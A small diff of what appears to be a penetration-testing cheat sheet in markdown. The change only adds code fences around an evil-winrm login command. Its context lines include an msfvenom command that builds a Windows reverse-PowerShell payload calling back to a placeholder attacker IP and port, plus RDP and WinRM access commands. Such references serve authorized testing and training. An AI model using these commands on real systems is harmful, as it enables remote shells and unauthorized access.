@@ -541,7 +541,9 @@ msfvenom -p cmd/windows/reverse_powershell lhost=<attacker-ip> lport=<port> > sh
 xfreerdp /u:<user> /d:Target_Domain>  /v:<target_IP>
 ```
 ### WinRM 5985 
+```bash
 evil-winrm -i <target_IP> -u <user> -p <password> 
+```
 
 </details>
 
